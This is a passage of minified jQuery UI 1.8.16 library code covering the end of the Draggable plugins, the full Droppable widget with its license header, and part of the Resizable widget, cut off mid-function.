:function(){this.helper.removeClass("ui-draggable-dragging");this.helper[0]!=this.element[0]&&!this.cancelHelperRemoval&&this.helper.remove();this.helper=null;this.cancelHelperRemoval=false},_trigger:function(a,b,c){c=c||this._uiHash();d.ui.plugin.call(this,a,[b,c]);if(a=="drag")this.positionAbs=this._convertPositionTo("absolute");return d.Widget.prototype._trigger.call(this,a,b,c)},plugins:{},_uiHash:function(){return{helper:this.helper,position:this.position,originalPosition:this.originalPosition,offset:this.positionAbs}}});d.extend(d.ui.draggable,{version:"1.8.16"});d.ui.plugin.add("draggable","connectToSortable",{start:function(a,b){var c=d(this).data("draggable"),f=c.options,e=d.extend({},b,{item:c.element});c.sortables=[];d(f.connectToSortable).each(function(){var h=d.data(this,"sortable");if(h&&!h.options.disabled){c.sortables.push({instance:h,shouldRevert:h.options.revert});h.refreshPositions();h._trigger("activate",a,e)}})},stop:function(a,b){var c=d(this).data("draggable"),f=d.extend({},b,{item:c.element});d.each(c.sortables,function(){if(this.instance.isOver){this.instance.isOver=0;c.cancelHelperRemoval=true;this.instance.cancelHelperRemoval=false;if(this.shouldRevert)this.instance.options.revert=true;this.instance._mouseStop(a);this.instance.options.helper=this.instance.options._helper;c.options.helper=="original"&&this.instance.currentItem.css({top:"auto",left:"auto"})}else{this.instance.cancelHelperRemoval=false;this.instance._trigger("deactivate",a,f)}})},drag:function(a,b){var c=d(this).data("draggable"),f=this;d.each(c.sortables,function(){this.instance.positionAbs=c.positionAbs;this.instance.helperProportions=c.helperProportions;this.instance.offset.click=c.offset.click;if(this.instance._intersectsWith(this.instance.containerCache)){if(!this.instance.isOver){this.instance.isOver=1;this.instance.currentItem=d(f).clone().removeAttr("id").appendTo(this.instance.element).data("sortable-item",true);this.instance.options._helper=this.instance.options.helper;this.instance.options.helper=function(){return b.helper[0]};a.target=this.instance.currentItem[0];this.instance._mouseCapture(a,true);this.instance._mouseStart(a,true,true);this.instance.offset.click.top=c.offset.click.top;this.instance.offset.click.left=c.offset.click.left;this.instance.offset.parent.left-=c.offset.parent.left-this.instance.offset.parent.left;this.instance.offset.parent.top-=c.offset.parent.top-this.instance.offset.parent.top;c._trigger("toSortable",a);c.dropped=this.instance.element;c.currentItem=c.element;this.instance.fromOutside=c}this.instance.currentItem&&this.instance._mouseDrag(a)}else if(this.instance.isOver){this.instance.isOver=0;this.instance.cancelHelperRemoval=true;this.instance.options.revert=false;this.instance._trigger("out",a,this.instance._uiHash(this.instance));this.instance._mouseStop(a,true);this.instance.options.helper=this.instance.options._helper;this.instance.currentItem.remove();this.instance.placeholder&&this.instance.placeholder.remove();c._trigger("fromSortable",a);c.dropped=false}})}});d.ui.plugin.add("draggable","cursor",{start:function(){var a=d("body"),b=d(this).data("draggable").options;if(a.css("cursor"))b._cursor=a.css("cursor");a.css("cursor",b.cursor)},stop:function(){var a=d(this).data("draggable").options;a._cursor&&d("body").css("cursor",a._cursor)}});d.ui.plugin.add("draggable","opacity",{start:function(a,b){a=d(b.helper);b=d(this).data("draggable").options;if(a.css("opacity"))b._opacity=a.css("opacity");a.css("opacity",b.opacity)},stop:function(a,b){a=d(this).data("draggable").options;a._opacity&&d(b.helper).css("opacity",a._opacity)}});d.ui.plugin.add("draggable","scroll",{start:function(){var a=d(this).data("draggable");if(a.scrollParent[0]!=document&&a.scrollParent[0].tagName!="HTML")a.overflowOffset=a.scrollParent.offset()},drag:function(a){var b=d(this).data("draggable"),c=b.options,f=false;if(b.scrollParent[0]!=document&&b.scrollParent[0].tagName!="HTML"){if(!c.axis||c.axis!="x")if(b.overflowOffset.top+b.scrollParent[0].offsetHeight-a.pageY<c.scrollSensitivity)b.scrollParent[0].scrollTop=f=b.scrollParent[0].scrollTop+c.scrollSpeed;else if(a.pageY-b.overflowOffset.top<c.scrollSensitivity)b.scrollParent[0].scrollTop=f=b.scrollParent[0].scrollTop-c.scrollSpeed;if(!c.axis||c.axis!="y")if(b.overflowOffset.left+b.scrollParent[0].offsetWidth-a.pageX<c.scrollSensitivity)b.scrollParent[0].scrollLeft=f=b.scrollParent[0].scrollLeft+c.scrollSpeed;else if(a.pageX-b.overflowOffset.left<c.scrollSensitivity)b.scrollParent[0].scrollLeft=f=b.scrollParent[0].scrollLeft-c.scrollSpeed}else{if(!c.axis||c.axis!="x")if(a.pageY-d(document).scrollTop()<c.scrollSensitivity)f=d(document).scrollTop(d(document).scrollTop()-c.scrollSpeed);else if(d(window).height()-(a.pageY-d(document).scrollTop())<c.scrollSensitivity)f=d(document).scrollTop(d(document).scrollTop()+c.scrollSpeed);if(!c.axis||c.axis!="y")if(a.pageX-d(document).scrollLeft()<c.scrollSensitivity)f=d(document).scrollLeft(d(document).scrollLeft()-c.scrollSpeed);else if(d(window).width()-(a.pageX-d(document).scrollLeft())<c.scrollSensitivity)f=d(document).scrollLeft(d(document).scrollLeft()+c.scrollSpeed)}f!==false&&d.ui.ddmanager&&!c.dropBehaviour&&d.ui.ddmanager.prepareOffsets(b,a)}});d.ui.plugin.add("draggable","snap",{start:function(){var a=d(this).data("draggable"),b=a.options;a.snapElements=[];d(b.snap.constructor!=String?b.snap.items||":data(draggable)":b.snap).each(function(){var c=d(this),f=c.offset();this!=a.element[0]&&a.snapElements.push({item:this,width:c.outerWidth(),height:c.outerHeight(),top:f.top,left:f.left})})},drag:function(a,b){for(var c=d(this).data("draggable"),f=c.options,e=f.snapTolerance,h=b.offset.left,g=h+c.helperProportions.width,n=b.offset.top,o=n+c.helperProportions.height,i=c.snapElements.length-1;i>=0;i--){var j=c.snapElements[i].left,l=j+c.snapElements[i].width,k=c.snapElements[i].top,m=k+c.snapElements[i].height;if(j-e<h&&h<l+e&&k-e<n&&n<m+e||j-e<h&&h<l+e&&k-e<o&&o<m+e||j-e<g&&g<l+e&&k-e<n&&n<m+e||j-e<g&&g<l+e&&k-e<o&&o<m+e){if(f.snapMode!="inner"){var p=Math.abs(k-o)<=e,q=Math.abs(m-n)<=e,r=Math.abs(j-g)<=e,s=Math.abs(l-h)<=e;if(p)b.position.top=c._convertPositionTo("relative",{top:k-c.helperProportions.height,left:0}).top-c.margins.top;if(q)b.position.top=c._convertPositionTo("relative",{top:m,left:0}).top-c.margins.top;if(r)b.position.left=c._convertPositionTo("relative",{top:0,left:j-c.helperProportions.width}).left-c.margins.left;if(s)b.position.left=c._convertPositionTo("relative",{top:0,left:l}).left-c.margins.left}var t=p||q||r||s;if(f.snapMode!="outer"){p=Math.abs(k-n)<=e;q=Math.abs(m-o)<=e;r=Math.abs(j-h)<=e;s=Math.abs(l-g)<=e;if(p)b.position.top=c._convertPositionTo("relative",{top:k,left:0}).top-c.margins.top;if(q)b.position.top=c._convertPositionTo("relative",{top:m-c.helperProportions.height,left:0}).top-c.margins.top;if(r)b.position.left=c._convertPositionTo("relative",{top:0,left:j}).left-c.margins.left;if(s)b.position.left=c._convertPositionTo("relative",{top:0,left:l-c.helperProportions.width}).left-c.margins.left}if(!c.snapElements[i].snapping&&(p||q||r||s||t))c.options.snap.snap&&c.options.snap.snap.call(c.element,a,d.extend(c._uiHash(),{snapItem:c.snapElements[i].item}));c.snapElements[i].snapping=p||q||r||s||t}else{c.snapElements[i].snapping&&c.options.snap.release&&c.options.snap.release.call(c.element,a,d.extend(c._uiHash(),{snapItem:c.snapElements[i].item}));c.snapElements[i].snapping=false}}}});d.ui.plugin.add("draggable","stack",{start:function(){var a=d(this).data("draggable").options;a=d.makeArray(d(a.stack)).sort(function(c,f){return(parseInt(d(c).css("zIndex"),10)||0)-(parseInt(d(f).css("zIndex"),10)||0)});if(a.length){var b=parseInt(a[0].style.zIndex)||0;d(a).each(function(c){this.style.zIndex=b+c});this[0].style.zIndex=b+a.length}}});d.ui.plugin.add("draggable","zIndex",{start:function(a,b){a=d(b.helper);b=d(this).data("draggable").options;if(a.css("zIndex"))b._zIndex=a.css("zIndex");a.css("zIndex",b.zIndex)},stop:function(a,b){a=d(this).data("draggable").options;a._zIndex&&d(b.helper).css("zIndex",a._zIndex)}})})(jQuery);

/*
 * jQuery UI Droppable 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Droppables
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.widget.js
 *jquery.ui.mouse.js
 *jquery.ui.draggable.js
 */
(function(d){d.widget("ui.droppable",{widgetEventPrefix:"drop",options:{accept:"*",activeClass:false,addClasses:true,greedy:false,hoverClass:false,scope:"default",tolerance:"intersect"},_create:function(){var a=this.options,b=a.accept;this.isover=0;this.isout=1;this.accept=d.isFunction(b)?b:function(c){return c.is(b)};this.proportions={width:this.element[0].offsetWidth,height:this.element[0].offsetHeight};d.ui.ddmanager.droppables[a.scope]=d.ui.ddmanager.droppables[a.scope]||[];d.ui.ddmanager.droppables[a.scope].push(this);a.addClasses&&this.element.addClass("ui-droppable")},destroy:function(){for(var a=d.ui.ddmanager.droppables[this.options.scope],b=0;b<a.length;b++)a[b]==this&&a.splice(b,1);this.element.removeClass("ui-droppable ui-droppable-disabled").removeData("droppable").unbind(".droppable");return this},_setOption:function(a,b){if(a=="accept")this.accept=d.isFunction(b)?b:function(c){return c.is(b)};d.Widget.prototype._setOption.apply(this,arguments)},_activate:function(a){var b=d.ui.ddmanager.current;this.options.activeClass&&this.element.addClass(this.options.activeClass);b&&this._trigger("activate",a,this.ui(b))},_deactivate:function(a){var b=d.ui.ddmanager.current;this.options.activeClass&&this.element.removeClass(this.options.activeClass);b&&this._trigger("deactivate",a,this.ui(b))},_over:function(a){var b=d.ui.ddmanager.current;if(!(!b||(b.currentItem||b.element)[0]==this.element[0]))if(this.accept.call(this.element[0],b.currentItem||b.element)){this.options.hoverClass&&this.element.addClass(this.options.hoverClass);this._trigger("over",a,this.ui(b))}},_out:function(a){var b=d.ui.ddmanager.current;if(!(!b||(b.currentItem||b.element)[0]==this.element[0]))if(this.accept.call(this.element[0],b.currentItem||b.element)){this.options.hoverClass&&this.element.removeClass(this.options.hoverClass);this._trigger("out",a,this.ui(b))}},_drop:function(a,b){var c=b||d.ui.ddmanager.current;if(!c||(c.currentItem||c.element)[0]==this.element[0])return false;var e=false;this.element.find(":data(droppable)").not(".ui-draggable-dragging").each(function(){var g=d.data(this,"droppable");if(g.options.greedy&&!g.options.disabled&&g.options.scope==c.options.scope&&g.accept.call(g.element[0],c.currentItem||c.element)&&d.ui.intersect(c,d.extend(g,{offset:g.element.offset()}),g.options.tolerance)){e=true;return false}});if(e)return false;if(this.accept.call(this.element[0],c.currentItem||c.element)){this.options.activeClass&&this.element.removeClass(this.options.activeClass);this.options.hoverClass&&this.element.removeClass(this.options.hoverClass);this._trigger("drop",a,this.ui(c));return this.element}return false},ui:function(a){return{draggable:a.currentItem||a.element,helper:a.helper,position:a.position,offset:a.positionAbs}}});d.extend(d.ui.droppable,{version:"1.8.16"});d.ui.intersect=function(a,b,c){if(!b.offset)return false;var e=(a.positionAbs||a.position.absolute).left,g=e+a.helperProportions.width,f=(a.positionAbs||a.position.absolute).top,h=f+a.helperProportions.height,i=b.offset.left,k=i+b.proportions.width,j=b.offset.top,l=j+b.proportions.height;switch(c){case "fit":return i<=e&&g<=k&&j<=f&&h<=l;case "intersect":return i<e+a.helperProportions.width/2&&g-a.helperProportions.width/2<k&&j<f+a.helperProportions.height/2&&h-a.helperProportions.height/2<l;case "pointer":return d.ui.isOver((a.positionAbs||a.position.absolute).top+(a.clickOffset||a.offset.click).top,(a.positionAbs||a.position.absolute).left+(a.clickOffset||a.offset.click).left,j,i,b.proportions.height,b.proportions.width);case "touch":return(f>=j&&f<=l||h>=j&&h<=l||f<j&&h>l)&&(e>=i&&e<=k||g>=i&&g<=k||e<i&&g>k);default:return false}};d.ui.ddmanager={current:null,droppables:{"default":[]},prepareOffsets:function(a,b){var c=d.ui.ddmanager.droppables[a.options.scope]||[],e=b?b.type:null,g=(a.currentItem||a.element).find(":data(droppable)").andSelf(),f=0;a:for(;f<c.length;f++)if(!(c[f].options.disabled||a&&!c[f].accept.call(c[f].element[0],a.currentItem||a.element))){for(var h=0;h<g.length;h++)if(g[h]==c[f].element[0]){c[f].proportions.height=0;continue a}c[f].visible=c[f].element.css("display")!="none";if(c[f].visible){e=="mousedown"&&c[f]._activate.call(c[f],b);c[f].offset=c[f].element.offset();c[f].proportions={width:c[f].element[0].offsetWidth,height:c[f].element[0].offsetHeight}}}},drop:function(a,b){var c=false;d.each(d.ui.ddmanager.droppables[a.options.scope]||[],function(){if(this.options){if(!this.options.disabled&&this.visible&&d.ui.intersect(a,this,this.options.tolerance))c=c||this._drop.call(this,b);if(!this.options.disabled&&this.visible&&this.accept.call(this.element[0],a.currentItem||a.element)){this.isout=1;this.isover=0;this._deactivate.call(this,b)}}});return c},dragStart:function(a,b){a.element.parents(":not(body,html)").bind("scroll.droppable",function(){a.options.refreshPositions||d.ui.ddmanager.prepareOffsets(a,b)})},drag:function(a,b){a.options.refreshPositions&&d.ui.ddmanager.prepareOffsets(a,b);d.each(d.ui.ddmanager.droppables[a.options.scope]||[],function(){if(!(this.options.disabled||this.greedyChild||!this.visible)){var c=d.ui.intersect(a,this,this.options.tolerance);if(c=!c&&this.isover==1?"isout":c&&this.isover==0?"isover":null){var e;if(this.options.greedy){var g=this.element.parents(":data(droppable):eq(0)");if(g.length){e=d.data(g[0],"droppable");e.greedyChild=c=="isover"?1:0}}if(e&&c=="isover"){e.isover=0;e.isout=1;e._out.call(e,b)}this[c]=1;this[c=="isout"?"isover":"isout"]=0;this[c=="isover"?"_over":"_out"].call(this,b);if(e&&c=="isout"){e.isout=0;e.isover=1;e._over.call(e,b)}}}})},dragStop:function(a,b){a.element.parents(":not(body,html)").unbind("scroll.droppable");a.options.refreshPositions||d.ui.ddmanager.prepareOffsets(a,b)}}})(jQuery);

/*
 * jQuery UI Resizable 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Resizables
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.mouse.js
 *jquery.ui.widget.js
 */
(function(e){e.widget("ui.resizable",e.ui.mouse,{widgetEventPrefix:"resize",options:{alsoResize:false,animate:false,animateDuration:"slow",animateEasing:"swing",aspectRatio:false,autoHide:false,containment:false,ghost:false,grid:false,handles:"e,s,se",helper:false,maxHeight:null,maxWidth:null,minHeight:10,minWidth:10,zIndex:1E3},_create:function(){var b=this,a=this.options;this.element.addClass("ui-resizable");e.extend(this,{_aspectRatio:!!a.aspectRatio,aspectRatio:a.aspectRatio,originalElement:this.element,_proportionallyResizeElements:[],_helper:a.helper||a.ghost||a.animate?a.helper||"ui-resizable-helper":null});if(this.element[0].nodeName.match(/canvas|textarea|input|select|button|img/i)){/relative/.test(this.element.css("position"))&&e.browser.opera&&this.element.css({position:"relative",top:"auto",left:"auto"});this.element.wrap(e('<div class="ui-wrapper" style="overflow: hidden;"></div>').css({position:this.element.css("position"),width:this.element.outerWidth(),height:this.element.outerHeight(),top:this.element.css("top"),left:this.element.css("left")}));this.element=this.element.parent().data("resizable",this.element.data("resizable"));this.elementIsWrapper=true;this.element.css({marginLeft:this.originalElement.css("marginLeft"),marginTop:this.originalElement.css("marginTop"),marginRight:this.originalElement.css("marginRight"),marginBottom:this.originalElement.css("marginBottom")});this.originalElement.css({marginLeft:0,marginTop:0,marginRight:0,marginBottom:0});this.originalResizeStyle=this.originalElement.css("resize");this.originalElement.css("resize","none");this._proportionallyResizeElements.push(this.originalElement.css({position:"static",zoom:1,display:"block"}));this.originalElement.css({margin:this.originalElement.css("margin")});this._proportionallyResize()}this.handles=a.handles||(!e(".ui-resizable-handle",this.element).length?"e,s,se":{n:".ui-resizable-n",e:".ui-resizable-e",s:".ui-resizable-s",w:".ui-resizable-w",se:".ui-resizable-se",sw:".ui-resizable-sw",ne:".ui-resizable-ne",nw:".ui-resizable-nw"});if(this.handles.constructor==String){if(this.handles=="all")this.handles="n,e,s,w,se,sw,ne,nw";var c=this.handles.split(",");this.handles={};for(var d=0;d<c.length;d++){var f=e.trim(c[d]),g=e('<div class="ui-resizable-handle '+("ui-resizable-"+f)+'"></div>');/sw|se|ne|nw/.test(f)&&g.css({zIndex:++a.zIndex});"se"==f&&g.addClass("ui-icon ui-icon-gripsmall-diagonal-se");this.handles[f]=".ui-resizable-"+f;this.element.append(g)}}this._renderAxis=function(h){h=h||this.element;for(var i in this.handles){if(this.handles[i].constructor==String)this.handles[i]=e(this.handles[i],this.element).show();if(this.elementIsWrapper&&this.originalElement[0].nodeName.match(/textarea|input|select|button/i)){var j=e(this.handles[i],this.element),l=0;l=/sw|ne|nw|se|n|s/.test(i)?j.outerHeight():j.outerWidth();j=["padding",/ne|nw|n/.test(i)?"Top":/se|sw|s/.test(i)?"Bottom":/^e$/.test(i)?"Right":"Left"].join("");h.css(j,l);this._proportionallyResize()}e(this.handles[i])}};this._renderAxis(this.element);this._handles=e(".ui-resizable-handle",this.element).disableSelection();this._handles.mouseover(function(){if(!b.resizing){if(this.className)var h=this.className.match(/ui-resizable-(se|sw|ne|nw|n|e|s|w)/i);b.axis=h&&h[1]?h[1]:"se"}});if(a.autoHide){this._handles.hide();e(this.element).addClass("ui-resizable-autohide").hover(function(){if(!a.disabled){e(this).removeClass("ui-resizable-autohide");b._handles.show()}},function(){if(!a.disabled)if(!b.resizing){e(this).addClass("ui-resizable-autohide");b._handles.hide()}})}this._mouseInit()},destroy:function(){this._mouseDestroy();var b=function(c){e(c).removeClass("ui-resizable ui-resizable-disabled ui-resizable-resizing").removeData("resizable").unbind(".resizable").find(".ui-resizable-handle").remove()};if(this.elementIsWrapper){b(this.element);var a=this.element;a.after(this.originalElement.css({position:a.css("position"),width:a.outerWidth(),height:a.outerHeight(),top:a.css("top"),left:a.css("left")})).remove()}this.originalElement.css("resize",this.originalResizeStyle);b(this.originalElement);return this},_mouseCapture:function(b){var a=false;for(var c in this.handles)if(e(this.handles[c])[0]==b.target)a=true;return!this.options.disabled&&a},_mouseStart:function(b){var a=this.options,c=this.element.position(),d=this.element;this.resizing=true;this.documentScroll={top:e(document).scrollTop(),left:e(document).scrollLeft()};if(d.is(".ui-draggable")||/absolute/.test(d.css("position")))d.css({position:"absolute",top:c.top,left:c.left});e.browser.opera&&/relative/.test(d.css("position"))&&d.css({position:"relative",top:"auto",left:"auto"});this._renderProxy();c=m(this.helper.css("left"));var f=m(this.helper.css("top"));if(a.containment){c+=e(a.containment).scrollLeft()||0;f+=e(a.containment).scrollTop()||0}this.offset=this.helper.offset();this.position={left:c,top:f};this.size=this._helper?{width:d.outerWidth(),height:d.outerHeight()}:{width:d.width(),height:d.height()};this.originalSize=this._helper?{width:d.outerWidth(),height:d.outerHeight()}:{width:d.width(),height:d.height()};this.originalPosition={left:c,top:f};this.sizeDiff={width:d.outerWidth()-d.width(),height:d.outerHeight()-d.height()};this.originalMousePosition={left:b.pageX,top:b.pageY};this.aspectRatio=typeof a.aspectRatio=="number"?a.aspectRatio:this.originalSize.width/this.originalSize.height||1;a=e(".ui-resizable-"+this.axis).css("cursor");e("body").css("cursor",a=="auto"?this.axis+"-resize":a);d.addClass("ui-resizable-resizing");this._propagate("start",b);return true},_mouseDrag:function(b){var a=this.helper,c=this.originalMousePosition,d=this._change[this.axis];if(!d)return false;c=d.apply(this,[b,b.pageX-c.left||0,b.pageY-c.top||0]);this._updateVirtualBoundaries(b.shiftKey);if(this._aspectRatio||b.shiftKey)c=this._updateRatio(c,b);c=this._respectSize(c,b);this._propagate("resize",b);a.css({top:this.position.top+"px",left:this.position.left+"px",width:this.size.width+"px",height:this.size.height+"px"});!this._helper&&this._proportionallyResizeElements.length&&this._proportionallyResize();this._updateCache(c);this._trigger("resize",b,this.ui());return false},_mouseStop:function(b){this.resizing=false;var a=this.options,c=this;if(this._helper){var d=this._proportionallyResizeElements,f=d.length&&/textarea/i.test(d[0].nodeName);d=f&&e.ui.hasScroll(d[0],"left")?0:c.sizeDiff.height;f=f?0:c.sizeDiff.width;f={width:c.helper.width()-f,height:c.helper.height()-d};d=parseInt(c.element.css("left"),10)+(c.position.left-c.originalPosition.left)||null;var g=parseInt(c.element.css("top"),10)+(c.position.top-c.originalPosition.top)||null;a.animate||this.element.css(e.extend(f,{top:g,left:d}));c.helper.height(c.size.height);c.helper.width(c.size.width);this._helper&&!a.animate&&this._proportionallyResize()}e("body").css("cursor","auto");this.element.removeClass("ui-resizable-resizing");this._propagate("stop",b);this._helper&&this.helper.remove();return false},_updateVirtualBoundaries:function(b){var a=this.options,c,d,f;a={minWidth:k(a.minWidth)?a.minWidth:0,maxWidth:k(a.maxWidth)?a.maxWidth:Infinity,minHeight:k(a.minHeight)?a.minHeight:0,maxHeight:k(a.maxHeight)?a.maxHeight:Infinity};if(this._aspectRatio||b){b=a.minHeight*this.aspectRatio;d=a.minWidth/this.aspectRatio;c=a.maxHeight*this.aspectRatio;f=a.maxWidth/this.aspectRatio;if(b>a.minWidth)a.minWidth=b;if(d>a.minHeight)a.minHeight=d;if(c<a.maxWidth)a.maxWidth=c;if(f<a.maxHeight)a.maxHeight=f}this._vBoundaries=a},_updateCache:function(b){this.offset=this.helper.offset();if(k(b.left))this.position.left=b.left;if(k(b.top))this.position.top=b.top;if(k(b.height))this.size.height=b.height;if(k(b.width))this.size.width=b.width},_updateRatio:function(b){var a=this.position,c=this.size,d=this.axis;if(k(b.height))b.width=b.height*this.aspectRatio;else if(k(b.width))b.height=b.width/this.aspectRatio;if(d=="sw"){b.left=a.left+(c.width-b.width);b.top=null}if(d=="nw"){b.top=a.top+(c.height-b.height);b.left=a.left+(c.width-b.width)}return b},_respectSize:function(b){var a=this._vBoundaries,c=this.axis,d=k(b.width)&&a.maxWidth&&a.maxWidth<b.width,f=k(b.height)&&a.maxHeight&&a.maxHeight<b.height,g=k(b.width)&&a.minWidth&&a.minWidth>b.width,h=k(b.height)&&a.minHeight&&a.minHeight>b.height;if(g)b.width=a.minWidth;if(h)b.height=a.minHeight;if(d)b.width=a.maxWidth;if(f)b.height=a.maxHeight;var i=this.originalPosition.left+this.originalSize.width,j=this.position.top+this.size.height,l=/sw|nw|w/.test(c);c=/nw|ne|n/.test(c);if(g&&l)b.left=i-a.minWidth;if(d&&l)b.left=i-a.maxWidth;if(h&&c)b.top=j-a.minHeight;if(f&&c)b.top=j-a.maxHeight;if((a=!b.width&&!b.height)&&!b.left&&b.top)b.top=null;else if(a&&!b.top&&b.left)b.left=null;return b},_proportionallyResize:function(){if(this._proportionallyResizeElements.length)for(var b=this.helper||this.element,a=0;a<this._proportionallyResizeElements.length;a++){var c=this._proportionallyResizeElements[a];if(!this.borderDif){var d=[c.css("borderTopWidth"),c.css("borderRightWidth"),c.css("borderBottomWidth"),c.css("borderLeftWidth")],f=[c.css("paddingTop"),c.css("paddingRight"),c.css("paddingBottom"),c.css("paddingLeft")];this.borderDif=e.map(d,function(g,h){g=parseInt(g,10)||0;h=parseInt(f[h],10)||0;return g+h})}e.browser.msie&&(e(b).is(":hidden")||e(b).parents(":hidden").length)||c.css({height:b.height()-this.borderDif[0]-this.borderDif[2]||0,width:b.width()-this.borderDif[1]-this.borderDif[3]||0})}},_renderProxy:function(){var b=this.options;this.elementOffset=this.element.offset();if(this._helper){this.helper=this.helper||e('<div style="overflow:hidden;"></div>');var a=e.browser.msie&&e.browser.version<7,c=a?1:0;a=a?2:-1;this.helper.addClass(this._helper).css({width:this.element.outerWidth()+a,height:this.element.outerHeight()+a,position:"absolute",left:this.elementOffset.left-c+"px",top:this.elementOffset.top-c+"px",zIndex:++b.zIndex});this.helper.appendTo("body").disableSelection()}else this.helper=this.element},_change:{e:function(b,a){return{width:this.originalSize.width+a}},w:function(b,a){return{left:this.originalPosition.left+a,width:this.originalSize.width-a}},n:function(b,a,c){return{top:this.originalPosition.top+c,height:this.originalSize.height-c}},s:function(b,a,c){return{height:this.originalSize.height+c}},se:function(b,a,c){return e.extend(this._change.s.apply(this,arguments),this._change.e.apply(this,[b,a,c]))},sw:function(b,a,c){return e.extend(this._change.s.apply(this,arguments),this._change.w.apply(this,[b,a,c]))},ne:function(b,a,c){return e.extend(this._change.n.apply(this,arguments),this._change.e.apply(this,[b,a,c]))},nw:function(b,a,c){return e.extend(this._change.n.apply(this,arguments),this._change.w.apply(this,[b,a,c]))}},_propagate:function(b,a){e.ui.plugin.call(this,b,[a,this.ui()]);b!="resize"&&this._trigger(b,a,this.ui())},plugins:{},ui:function(){return{originalElement:this.originalElement,element:this.element,helper:this.helper,position:this.position,size:this.size,originalSize:this.originalSize,originalPosition:this.originalPosition}}});e.extend(e.ui.resizable,{version:"1.8.16"});e.ui.plugin.add("resizable","alsoResize",{start:function(){var b=e(this).data("resizable").options,a=function(c){e(c).each(function(){var d=e(this);d.data("resizable-alsoresize",{width:parseInt(d.width(),10),height:parseInt(d.height(),10),left:parseInt(d.css("left"),10),top:parseInt(d.css("top"),10),position:d.css("position")})})};if(typeof b.alsoResize=="object"&&!b.alsoResize.parentNode)if(b.alsoResize.length){b.alsoResize=b.alsoResize[0];a(b.alsoResize)}else e.each(b.alsoResize,function(c){a(c)});else a(b.alsoResize)},resize:function(b,a){var c=e(this).data("resizable");b=c.options;var d=c.originalSize,f=c.originalPosition,g={height:c.size.height-d.height||0,width:c.size.width-d.width||0,top:c.position.top-f.top||0,left:c.position.left-f.left||0},h=function(i,j){e(i).each(function(){var l=e(this),q=e(this).data("resizable-alsoresize"),p={},r=j&&j.length?j:l.parents(a.originalElement[0]).length?["width","height"]:["width","height","top","left"];e.each(r,function(n,o){if((n=(q[o]||0)+(g[o]||0))&&n>=0)p[o]=n||null});if(e.browser.opera&&/relative/.test(l.css("position"))){c._revertToRelativePosition=true;l.css({position:"absolute",top:"auto",left:"auto"})}l.css(p)})};typeof b.alsoResize=="object"&&!b.alsoResize.nodeType?e.each(b.alsoResize,function(i,j){h(i,j)}):h(b.alsoResize)},stop:function(){var b=e(this).data("resizable"),a=b.options,c=function(d){e(d).each(function(){var f=e(this);f.css({position:f.data("resizable-alsoresize").position})})};if(b._revertToRelativePosition){b._revertToRelativePosition=false;typeof a.alsoResize=="object"&&!a.alsoResize.nodeType?e.each(a.alsoResize,function(d){c(d)}):c(a.alsoResize)}e(this).removeData("resizable-alsoresize")}});e.ui.plugin.add("resizable","animate",{stop:function(b){var a=e(this).data("resizable"),c=a.options,d=a._proportionallyResizeElements,f=d.length&&/textarea/i.test(d[0].nodeName),g=f&&e.ui.hasScroll(d[0],"left")?0:a.sizeDiff.height;f={width:a.size.width-(f?0:a.sizeDiff.width),height:a.size.height-g};g=parseInt(a.element.css("left"),10)+(a.position.left-a.originalPosition.left)||null;var h=parseInt(a.element.css("top"),10)+(a.position.top-a.originalPosition.top)||null;a.element.animate(e.extend(f,h&&g?{top:h,left:g}:{}),{duration:c.animateDuration,easing:c.animateEasing,step:function(){var i={width:parseInt(a.element.css("width"),10),height:parseInt(a.element.css("height"),10),top:parseInt(a.element.css("top"),10),left:parseInt(a.element.css("left"),10)};d&&d.length&&e(d[0]).css({width:i.width,height:i.height});a._updateCache(i);a._propagate("resize",b)}})}});e.ui.plugin.add("resizable","containment",{start:function(){var b=e(this).data("resizable"),a=b.element,c=b.options.containment;if(a=c instanceof e?c.get(0):/parent/.test(c)?a.parent().get(0):c){b.containerElement=e(a);if(/document/.test(c)||c==document){b.containerOffset={left:0,top:0};b.containerPosition={left:0,top:0};b.parentData={element:e(document),left:0,top:0,width:e(document).width(),height:e(document).height()||document.body.parentNode.scrollHeight}}else{var d=e(a),f=[];e(["Top","Right","Left","Bottom"]).each(function(i,j){f[i]=m(d.css("padding"+j))});b.containerOffset=d.offset();b.containerPosition=d.position();b.containerSize={height:d.innerHeight()-f[3],width:d.innerWidth()-f[1]};c=b.containerOffset;var g=b.containerSize.height,h=b.containerSize.width;h=e.ui.hasScroll(a,"left")?a.scrollWidth:h;g=e.ui.hasScroll(a)?a.scrollHeight:g;b.parentData={element:a,left:c.left,top:c.top,width:h,height:g}}}},resize:function(b){var a=e(this).data("resizable"),c=a.options,d=a.containerOffset,f=a.position;b=a._aspectRatio||b.shiftKey;var g={top:0,left:0},h=a.containerElement;if(h[0]!=document&&/static/.test(h.css("position")))g=d;if(f.left<(a._helper?d.left:0)){a.size.width+=a._helper?a.position.left-d.left:a.position.left-g.left;if(b)a.size.height=a.size.width/c.aspectRatio;a.position.left=c.helper?d.left:0}if(f.top<(a._helper?d.top:0)){a.size.height+=a._helper?a.position.top-d.top:a.position.top;if(b)a.size.width=a.size.height*c.aspectRatio;a.position.top=a._helper?d.top:0}a.offset.left=a.parentData.left+a.position.left;a.offset.top=a.parentData.top+a.position.top;c=Math.abs((a._helper?a.offset.left-g.left:a.offset.left-g.left)+a.sizeDiff.width);d=Math.abs((a._helper?a.offset.top-g.top:a.offset.top-d.top)+a.sizeDiff.height);f=a.containerElement.get(0)==a.element.parent().get(0);g=/relative|absolute/.test(a.containerElement.css("position"));if(f&&g)c-=a.parentData.left;if(c+a.size.width>=a.parentData.width){a.size.width=a.parentData.width-c;if(b)a.size.height=a.size.width/a.aspectRatio}if(d+a.size.height>=a.parentData.height){a.size.height=a.parentData.height-d;if(b)a.size.width=a.size.height*a.aspectRatio}},stop:function(){var 